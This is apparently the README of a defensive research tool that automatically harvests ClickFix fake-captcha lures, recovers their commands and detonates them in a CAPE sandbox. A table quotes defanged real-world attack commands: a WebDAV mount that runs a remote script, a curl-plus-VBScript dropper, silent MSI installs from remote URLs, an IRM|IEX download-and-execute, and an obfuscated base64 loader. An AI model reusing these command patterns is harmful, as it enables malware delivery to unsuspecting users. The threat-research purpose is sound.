# Automated ClickFix Payload Collection & Analysis at Scale

A continuous, hands-off pipeline that discovers live **ClickFix** lures from
multiple threat feeds, recovers the command each lure tries to trick a victim
into running, and detonates the Windows payloads in a CAPE sandbox — fully
automated, deduplicated, and surfaced on a live dashboard.

> ⚠️ **Defensive security tooling.** This repository contains **source code only**.
> No malware samples, captured payloads, IOC database, or credentials are included
> (see `.gitignore`). Running it detonates live malware and must only be done in an
> isolated, authorized sandbox.

## What it does

```
sources ──► recover ──► validate ──► classify ──► dedup ──► detonate ──► record
```

1. **Collect** candidate lure URLs from three sources each sweep:
   - **urlscan.io** (search API + captured DOM + headless-browser fallback)
   - **URLhaus** (abuse.ch authenticated tag API)
   - a curated **ClickFix domain gist**
2. **Recover** the command: headless Chromium with a Windows identity drives the
   fake-captcha UI and captures the clipboard write; static extraction handles the
   rest (incl. JSON per-OS command arrays and obfuscated loaders).
3. **Validate & classify** — content-aware length gating, PowerShell/MSI/batch/exe
   detection; non-Windows (macOS `bash`) lures are recorded but not detonated.
4. **Deduplicate** on both the **payload hash** (never run the same command twice)
   and the **source domain/IP** (polymorphic hosts that repack per request run once).
5. **Detonate** in a CAPE Windows VM (submits a `.ps1` named after the source domain).
6. **Record** every domain, payload, consumed URL and recovery outcome in a SQLite
   intel store, viewable via a terminal snapshot (`status.sh`) or a local web
   dashboard (`dashboard_server.py`, served over an SSH tunnel).

## 📊 Live Pipeline Statistics & Telemetry

*Metrics collected directly from the production collector and CAPE detonation engine.*

### Operational Overview

| Metric | Total |
|---|---|
| **URLs Consumed** | **1,106** |
| **Total Sightings** | **4,053** |
| **Distinct Payloads Recovered** | **50** |
| **Unique Malicious Domains** | **34** |
| **Lure Landing Sites Served** | **52** |
| **CAPE Sandbox Detonation Tasks** | **75+** |

### Feed Ingestion Breakdown

| Feed Source | Distinct URLs | Total Sightings | Focus / Delivery |
|---|---|---|---|
| **Curated Gist** | 941 | 1,038 | High-volume candidate discovery |
| **urlscan.io** | 149 | 2,104 | Real-time scanner queries + DOM harvesting |
| **URLhaus (abuse.ch)** | 16 | 911 | Verified community-tagged malicious lures |

### Observed Attack Vectors & Payload Profiles

*(Sample of real-world payloads intercepted by the pipeline; IOCs defanged for safe research)*

| Delivery Vector | Type | Intercepted Command Pattern | Sandbox Task |
|---|---|---|---|
| **WebDAV Remote Mount** | `batch` | `cmd.exe /c net use Z: hxxp://144.31.47[.]76/webdav /persistent:no && powershell -ExecutionPolicy Bypass -File "Z:\script.ps1" & net use Z: /delete` | CAPE #74 |
| **cURL Dropper + VBScript** | `batch` | `cmd /c "curl -s hxxp://178.17.59[.]40:5506/qk.vbs -o %temp%\qk.vbs >nul && wscript.exe //B //E:VBScript %temp%\qk.vbs"` | CAPE #75 |
| **Silent MSI Stager** | `batch` | `msiexec /i hxxps://activityof[.]com/datei /qn` | CAPE #71 |
| **Google Drive MSI Stager** | `batch` | `msiexec /i hxxps://drive.google[.]com/uc?export=download&id=1CjSD0JhJj42n2yygv_75tmpvl6Uqic4o /qn` | CAPE #69 |
| **CDN Quote-Bypass Download-String** | `ps1` | `IRM fastly.jsdelivr[.]net/g"h"/jkdjkjg374/47f8-b361-67fa79d9feda/6FC-5B-20-FA-7C \| IEX` | CAPE #72 |
| **Obfuscated Base64 Reflection Loader** | `ps1` | `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$env:jSXyp27VKTz='[OriginalDatabase]';[Hb3ZkpbU2V7IRFx]"...[Convert]::FromBase64String('AwAAACQCA0UDBHIEBXIFBm8GB3IHCEEICWMJCnQKC2kLDG8MDW4NDlAOD3IPEGUQEWYREmUSE3ITFGUUFW4VFmMWF2UXGD...'` | CAPE #66 |


## Layout

| Path | Purpose |
|---|---|
| `clickfix/clickfix_catcher.py` | the engine — sweep → recover → detonate |
| `clickfix/livefeeds.py` | URLhaus + ClickFix-gist sources |
| `clickfix/browser_extractor.py` | headless-Chromium clipboard recovery |
| `clickfix/clickgrab_extract.py` | static command extraction |
| `clickfix/validate.py` · `classify.py` · `sanitize.py` | pre-submission gates |
| `clickfix/cape_client.py` | CAPE API client |
| `clickfix/collection.py` | SQLite intel/dedup store |
| `clickfix/dashboard_server.py` · `status.sh` | live views |
| `clickfix-*.service` | systemd units for continuous operation |
| `tests/` | offline unit tests |

## Requirements

Python 3.12, `requests`, Playwright (Chromium) for the browser path, and a reachable
CAPE v2 instance. Secrets (urlscan / URLhaus API keys) are read from the environment,
never committed.
